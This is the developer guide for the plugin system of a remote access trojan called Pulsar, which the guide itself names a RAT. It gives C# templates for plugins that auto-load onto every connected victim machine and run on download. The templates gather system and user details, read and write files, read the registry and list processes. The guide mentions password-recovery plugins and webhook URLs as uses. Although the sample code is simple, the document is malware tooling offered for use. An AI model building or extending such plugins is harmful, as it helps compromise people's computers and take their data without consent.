# Pulsar Plugin System - Developer Guide

Welcome to the Pulsar Plugin System! This guide will teach you how to create powerful plugins that can run on client machines through the Pulsar RAT system.

## 📋 Table of Contents
- [Quick Start](#-quick-start)
- [Plugin Types](#-plugin-types)
- [Creating Your First Plugin](#-creating-your-first-plugin)
- [Advanced Features](#-advanced-features)
- [Code Templates](#-code-templates)
- [Troubleshooting](#-troubleshooting)

## Quick Start

### What You Need
- **Visual Studio** or **VS Code** with C# support
- **Basic C# knowledge** (variables, methods, classes)
- **Most importantly, a brain**

### Plugin System Overview
- **Client Plugins**: Run on the target machine (what we'll focus on)
- **Server Plugins**: Run on the server (for UI and management)
- **Universal System**: Works with any .NET Framework 4.7.2+ project

## Plugin Types

### 0. **Client-Only Auto Plugins** (New)
- Target a single assembly that implements `IUniversalPlugin`
- Name the compiled DLL with a `.Client.dll` suffix (for example `ActionPlugin.Client.dll`) and drop it into `Pulsar.Server/Plugins`
- Every connected client loads the plugin automatically without any server UI wiring
- The plugin's `Initialize` method runs immediately after download, perfect for one-shot actions
- Update the `Version` property when you publish a new build so clients receive the fresh copy
- Optional: place a `<PluginName>.init` file next to your DLL to supply raw init data bytes

### 1. **Server-Only Plugins** (Run on server machine)
- Add menu items to the server interface
- Create custom server UI windows
- Handle server-side data processing
- **Example**: Custom client management tools, server utilities

### 2. **Server-Client Plugins** (Both components needed)
- Server part: UI and menu integration
- Client part: Actual work on target machine
- Communication between server and client
- **Example**: passwords recovery, etc

## Important Terms Explained

### Plugin State
- **`IsComplete`**: Tells the system if your plugin is done working
- **`_isRunning`**: Your own variable to track if plugin is busy
- **`ShouldUnload`**: Tells system to remove plugin from memory when done

### Plugin Lifecycle
1. **Initialize()**: Called when plugin loads (setup code here)
2. **ExecuteCommand()**: Called for each command from server
3. **IsComplete**: Checked to see if plugin is done
4. **Cleanup()**: Called when plugin is removed (cleanup code here)

### PluginResult Properties
- **Success**: Did the command work? (true/false)
- **Message**: Status message for the server
- **Data**: Raw data to send back (use Encoding.UTF8.GetBytes())
- **ShouldUnload**: Remove plugin when this command finishes?

### initData Parameter
- **What it is**: Data sent from server to plugin when it loads
- **Common uses**: Configuration, webhook URLs, file paths
- **How to use**: `string config = Encoding.UTF8.GetString(initData);`

## Creating Your First Plugin

### Step 1: Create a New Project
1. Open Visual Studio
2. Create new **Class Library (.NET Framework 4.7.2)** project
3. Name it something like `MyFirstPlugin`

### Step 2: Copy the Template Code
Replace your `Class1.cs` with this template:

```csharp
using System;
using System.Text;
using Pulsar.Client.Plugins;

namespace MyFirstPlugin
{
    public class MyFirstPlugin : IUniversalPlugin
    {
        // Plugin Information
        public string PluginId => "myfirstplugin";
        public string Version => "1.0";
        public string[] SupportedCommands => new[] { "hello", "info", "status" };
        
        // Plugin State
        private bool _isRunning = false;
        
        // Initialize the plugin
        public void Initialize(byte[] initData)
        {
            // This runs when the plugin is loaded
            // initData contains any data sent from the server
        }
        
        // Handle commands from the server
        public PluginResult ExecuteCommand(string command, byte[] parameters)
        {
            try
            {
                switch (command)
                {
                    case "hello":
                        return SayHello();
                        
                    case "info":
                        return GetSystemInfo();
                        
                    case "status":
                        return GetStatus();
                        
                    default:
                        return new PluginResult 
                        { 
                            Success = false, 
                            Message = "Unknown command" 
                        };
                }
            }
            catch (Exception ex)
            {
                return new PluginResult 
                { 
                    Success = false, 
                    Message = $"Error: {ex.Message}" 
                };
            }
        }
        
        // Check if plugin is done
        public bool IsComplete => !_isRunning;
        
        // Cleanup when plugin is unloaded
        public void Cleanup()
        {
            _isRunning = false;
        }
        
        // Your custom methods
        private PluginResult SayHello()
        {
            return new PluginResult 
            { 
                Success = true, 
                Message = "Hello from my first plugin!",
                ShouldUnload = true
            };
        }
        
        private PluginResult GetSystemInfo()
        {
            var info = new StringBuilder();
            info.AppendLine("=== System Information ===");
            info.AppendLine($"Computer: {Environment.MachineName}");
            info.AppendLine($"User: {Environment.UserName}");
            info.AppendLine($"OS: {Environment.OSVersion}");
            info.AppendLine($"Time: {DateTime.Now}");
            
            return new PluginResult 
            { 
                Success = true, 
                Message = "System info collected",
                Data = Encoding.UTF8.GetBytes(info.ToString()),
                ShouldUnload = true
            };
        }
        
        private PluginResult GetStatus()
        {
            return new PluginResult 
            { 
                Success = true, 
                Message = $"Plugin is running: {_isRunning}",
                ShouldUnload = false
            };
        }
    }
}
```

### Step 3: Add Required References
Add these NuGet packages to your project:
- **MessagePack** 
- **Pulsar.Common**

### Step 4: Build Your Plugin
1. Build your project in **Release** mode
2. Copy the `.dll` file to the server's plugin directory
3. Test it through the Pulsar server interface

## 🎨 Code Templates

### Template 0: Auto-Loaded Message Box (Client Only)
```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;
using Pulsar.Common.Plugins;

namespace ActionPlugins
{
    public sealed class ActionPlugin : IUniversalPlugin
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        public string PluginId => "actionplugin";
        public string Version => "1.0.0";
        public string[] SupportedCommands => Array.Empty<string>();

        public void Initialize(byte[] initData)
        {
            var message = initData is { Length: > 0 }
                ? Encoding.UTF8.GetString(initData)
                : "Action executed!";

            MessageBox(IntPtr.Zero, message, "Action Plugin", 0);
        }

        public PluginResult ExecuteCommand(string command, byte[] parameters)
        {
            return new PluginResult
            {
                Success = false,
                Message = "No commands supported",
                ShouldUnload = true
            };
        }

        public bool IsComplete => true;
        public void Cleanup() { }
    }
}
```
Compile the project as `ActionPlugin.Client.dll` (or any name ending in `.Client.dll`) and drop it into `Pulsar.Server/Plugins`. If you want to change the message at runtime, create a text file named `ActionPlugin.Client.init` next to the DLL containing the message body (UTF-8 encoded).

### Template 1: Information Collector
```csharp
public class InfoCollector : IUniversalPlugin
{
    public string PluginId => "infocollector";
    public string Version => "1.0";
    public string[] SupportedCommands => new[] { "collect" };
    
    public void Initialize(byte[] initData) { }
    
    public PluginResult ExecuteCommand(string command, byte[] parameters)
    {
        if (command == "collect")
        {
            var info = CollectInformation();
            return new PluginResult 
            { 
                Success = true, 
                Message = "Information collected",
                Data = Encoding.UTF8.GetBytes(info),
                ShouldUnload = true
            };
        }
        return new PluginResult { Success = false, Message = "Unknown command" };
    }
    
    public bool IsComplete => true;
    public void Cleanup() { }
    
    private string CollectInformation()
    {
        // Your information collection code here
        return "Collected information...";
    }
}
```

### Template 2: Action Plugin
```csharp
public class ActionPlugin : IUniversalPlugin
{
    public string PluginId => "actionplugin";
    public string Version => "1.0";
    public string[] SupportedCommands => new[] { "execute" };
    
    private bool _isExecuting = false;
    
    public void Initialize(byte[] initData) { }
    
    public PluginResult ExecuteCommand(string command, byte[] parameters)
    {
        if (command == "execute")
        {
            _isExecuting = true;
            var result = PerformAction();
            _isExecuting = false;
            
            return new PluginResult 
            { 
                Success = true, 
                Message = result,
                ShouldUnload = true
            };
        }
        return new PluginResult { Success = false, Message = "Unknown command" };
    }
    
    public bool IsComplete => !_isExecuting;
    public void Cleanup() { _isExecuting = false; }
    
    private string PerformAction()
    {
        // Your action code here
        return "Action completed successfully!";
    }
}

```

### Template 3: Context Menu Client + Server Pair
This example ships a client plugin and hooks a context menu item on the server. When the menu item is clicked, each selected client displays a message box.

**Server plugin (compile as `ContextMenuMessage.Server.dll`):**

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Pulsar.Server.Networking;
using Pulsar.Server.Plugins;

namespace ExamplePlugins.ContextMenu
{
    public sealed class ContextMenuServerPlugin : IServerPlugin
    {
        private string _pluginDirectory = string.Empty;

        public string Name => "Context Menu Message";
        public Version PluginVersion => new Version(1, 0, 0, 0);
        public string Author => "Example";
        public string Description => "Adds a context menu entry that shows a client-side message box.";
        public bool AutoLoadToClients => false;

        public void Initialize(IServerContext context)
        {
            _pluginDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) ?? AppDomain.CurrentDomain.BaseDirectory;

            context.AddClientContextMenuItem(new[] { "Examples" }, "Show Message", OnShowMessageClicked);
        }

        public void Dispose() { }

        private void OnShowMessageClicked(IReadOnlyList<Client> clients)
        {
            try
            {
                var clientAssemblyPath = Path.Combine(_pluginDirectory, "ContextMenuMessage.Client.dll");
                if (!File.Exists(clientAssemblyPath))
                {
                    MessageBox.Show("ContextMenuMessage.Client.dll not found next to the server plugin.", "Context Menu Plugin", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                var assemblyBytes = File.ReadAllBytes(clientAssemblyPath);
                foreach (var client in clients)
                {
                    var pluginId = $"context.menu.message.{client.Id:N}";
                    PushSender.LoadUniversalPlugin(client, pluginId, assemblyBytes, Array.Empty<byte>(), "ExamplePlugins.ContextMenu.ContextMenuClientPlugin", "Initialize");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Context menu plugin failed: {ex.Message}", "Context Menu Plugin", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
```

**Client plugin (compile as `ContextMenuMessage.Client.dll`):**

```csharp
using System;
using System.Runtime.InteropServices;
using Pulsar.Common.Plugins;

namespace ExamplePlugins.ContextMenu
{
    public sealed class ContextMenuClientPlugin : IUniversalPlugin
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        public string PluginId => "contextmenumessage";
        public string Version => "1.0.0";
        public string[] SupportedCommands => Array.Empty<string>();

        public void Initialize(byte[] initData)
        {
            MessageBox(IntPtr.Zero, "Hello from the context menu action!", "Context Menu Plugin", 0);
        }

        public PluginResult ExecuteCommand(string command, byte[] parameters)
        {
            return new PluginResult
            {
                Success = false,
                Message = "No commands supported",
                ShouldUnload = true
            };
        }

        public bool IsComplete => true;
        public void Cleanup() { }
    }
}
```

Place both DLLs in `Pulsar.Server/Plugins`. The client DLL must keep the `.Client.dll` suffix so Pulsar auto-dispatches it.

### Template 4: Server-Only Message Box Plugin
```csharp
using System;
using System.Windows.Forms;
using Pulsar.Server.Plugins;

namespace ExamplePlugins.ServerOnly
{
    public sealed class ServerHelloPlugin : IServerPlugin
    {
        public string Name => "Server Hello";
        public Version PluginVersion => new Version(1, 0, 0, 0);
        public string Author => "Example";
        public string Description => "Shows a message box when the plugin loads.";
        public bool AutoLoadToClients => false;

        public void Initialize(IServerContext context)
        {
            MessageBox.Show("Hello from the server plugin!", "Server Hello", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        public void Dispose() { }
    }
}


## 🔧 Advanced Features

### Working with Files
```csharp
private string ReadFile(string filePath)
{
    try
    {
        return File.ReadAllText(filePath);
    }
    catch (Exception ex)
    {
        return $"Error reading file: {ex.Message}";
    }
}

private bool WriteFile(string filePath, string content)
{
    try
    {
        File.WriteAllText(filePath, content);
        return true;
    }
    catch
    {
        return false;
    }
}
```

### Working with Registry

```csharp
private string GetRegistryValue(string keyPath, string valueName)
{
    try
    {
        using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath))
        {
            return key?.GetValue(valueName)?.ToString() ?? "Not found";
        }
    }
    catch
    {
        return "Error accessing registry";
    }
}
```

### Working with Processes
```csharp
private string GetRunningProcesses()
{
    var processes = Process.GetProcesses();
    var result = new StringBuilder();
    
    foreach (var process in processes.Take(10)) // Limit to first 10
    {
        result.AppendLine($"{process.ProcessName} (PID: {process.Id})");
    }
    
    return result.ToString();
}
```

## Stuff good to know about

### 1. **Error Handling**
Always wrap your code in try-catch blocks:
```csharp
try
{
    // Your code here
    return new PluginResult { Success = true, Message = "Success" };
}
catch (Exception ex)
{
    return new PluginResult { Success = false, Message = ex.Message };
}
```

### 2. **Resource Management**
Clean up resources in the `Cleanup()` method:
```csharp
private HttpClient _httpClient;

public void Cleanup()
{
    _httpClient?.Dispose();
}
```

### 3. **Memory Management**
Use `using` statements for disposable objects:
```csharp
using (var stream = new FileStream(path, FileMode.Open))
{
    // Use stream here
}
```

### 4. **Plugin State**
Use the `IsComplete` property to indicate when your plugin is done:
```csharp
private bool _isProcessing = false;

public bool IsComplete => !_isProcessing;
```

## Troubleshooting

### Common Issues

**1. "Plugin not found" error**
- Make sure your plugin implements `IUniversalPlugin`
- Check that `PluginId` is unique
- Verify the plugin is built in Release mode

**2. "Command not supported" error**
- Add your command to the `SupportedCommands` array
- Make sure the command name matches exactly (case-sensitive)

**3. "Plugin crashes" error**
- Add try-catch blocks around your code
- Check for null references
- Use the `Cleanup()` method to reset state

**4. "Data not received" error**
- Make sure to set `Data` property in `PluginResult`
- Use `Encoding.UTF8.GetBytes()` for string data
- Check that `ShouldUnload` is set correctly

### Debug Tips

1. **Use the Message property** to return status information
2. **Set ShouldUnload = true** when your plugin is done
3. **Use the Data property** to return large amounts of data
4. **Test your plugin** with simple commands first

##  Need Help?

1. **Start simple** with basic information collection
2. **Test frequently** during development
3. **ask** Do not ask me for help in t.me/PulsarPlugins , this project was a HEADACHE

##  You're Ready!

You now have everything you need to create powerful Pulsar plugins.
Start with the simple templates and gradually work your way up to more complex plugins.
Remember: **start simple, test often, and have fun!**

---

*Happy Plugin Development! (more like goodluck) *